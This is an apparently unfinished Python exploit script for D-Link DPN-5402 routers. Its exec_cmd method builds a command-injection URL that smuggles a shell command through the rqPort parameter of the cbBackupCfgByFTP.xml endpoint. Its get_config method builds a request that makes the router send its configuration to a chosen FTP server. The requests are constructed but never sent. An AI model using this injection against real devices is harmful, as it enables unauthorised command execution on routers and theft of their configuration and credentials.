#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# D-Link DPN-5402 remote exploit

__author__ = '090h'
__license__ = 'GPL'

from sys import argv, exit
from os import path
from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter
from requests import get

class Dpn5402(object):

    def __init__(self, host):
        self.host = host

    def exec_cmd(self, cmd):
        print(cmd)
        url = "http://%s/goform/cbBackupCfgByFTP.xml?rqProtocol=tftp&rqServerIP=1.3.3.7&rqPort=69|%s||&rqFileName=settings"
        print(url)

    def get_config(self, proto="ftp", host='192.168.0.2', port=21, user='anonymous', password='qwe@asd.ru', filename='settings'):
        url = "http://%s/goform/cbBackupCfgByFTP.xml?rqProtocol=%s&rqServerIP=%s&rqPort=%i&rqUsername=%s&rqPassword=%s&rqFileName=%s" % \
              (self.host, proto, host, port, user, password, filename)
        pass

if __name__ == '__main__':
    pass